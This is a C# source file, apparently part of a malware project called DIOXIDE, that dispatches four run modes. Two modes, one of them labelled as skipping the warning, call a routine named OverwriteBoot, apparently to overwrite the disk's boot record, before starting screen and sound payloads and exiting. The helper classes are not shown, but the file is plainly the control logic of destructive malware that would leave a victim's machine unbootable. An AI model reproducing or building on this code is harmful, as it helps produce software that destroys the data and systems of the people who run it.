using System.Threading;
using System.Windows.Forms;

namespace DIOXIDE
{
    class execute
    {
        public static void executeEWP()
        {
            destruction destruction = new destruction();
            payloads payloads = new payloads();

            Application.EnableVisualStyles();
            Win32API.SetProcessDPIAware();

            destruction.WARNING();

            payloads.CreateWaveFile();

            Thread.Sleep(5000);

            run_payloads.PStart();
        }
        public static void executeNWD()
        {
            destruction destruction = new destruction();
            payloads payloads = new payloads();

            Application.EnableVisualStyles();
            Win32API.SetProcessDPIAware();

            payloads.CreateWaveFile();

            destruction.OverwriteBoot();

            Thread.Sleep(5000);

            run_payloads.DStart();

            destruction.Exit();
        }
        public unsafe static void executeP()
        {
            payloads payloads = new payloads();
            run_payloads run_payloads = new run_payloads();
            
            Application.EnableVisualStyles();
            Win32API.SetProcessDPIAware();

            payloads.CreateWaveFile();

            Thread.Sleep(5000);

            run_payloads.PStart();
        }
        public static void executeD()
        {
            destruction destruction = new destruction();
            payloads payloads = new payloads();

            Application.EnableVisualStyles();
            Win32API.SetProcessDPIAware();

            destruction.WARNING();

            payloads.CreateWaveFile();

            destruction.OverwriteBoot();

            Thread.Sleep(5000);

            run_payloads.DStart();

            destruction.Exit();
        }
    }
}
